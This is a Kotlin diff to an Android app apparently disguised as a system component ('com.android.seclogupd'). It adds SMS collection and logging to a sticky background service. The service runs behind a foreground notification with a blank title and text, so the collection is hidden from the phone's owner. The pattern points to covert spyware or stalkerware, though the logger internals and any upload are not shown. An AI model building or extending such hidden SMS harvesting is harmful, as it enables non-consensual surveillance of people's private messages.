@@ -9,6 +9,8 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import com.android.seclogupd.data.DatabaseProvider
+import com.android.seclogupd.logger.MetaLogger
+import com.android.seclogupd.logger.SmsLogger
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -22,8 +24,10 @@ class LoggerService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         CoroutineScope(Dispatchers.IO).launch {
-            val db = DatabaseProvider.getDatabase(applicationContext)
+            val db = DatabaseProvider.getInstance(applicationContext)
             // TODO: شروع عملیات لاگ‌گیری از ماژول‌ها
+            MetaLogger(applicationContext, db).logStart("sms")
+            SmsLogger(applicationContext, db).collect()
         }
         return START_STICKY
     }
@@ -44,11 +48,15 @@ class LoggerService : Service() {
             manager.createNotificationChannel(channel)
         }
 
-        val notification: Notification = Notification.Builder(this, channelId)
-            .setContentTitle("")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.stat_notify_more)
-            .build()
+        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Notification.Builder(this, channelId)
+                .setContentTitle("")
+                .setContentText("")
+                .setSmallIcon(android.R.drawable.stat_notify_more)
+                .build()
+        } else {
+            TODO("VERSION.SDK_INT < O")
+        }
 
         startForeground(notificationId, notification)
     }
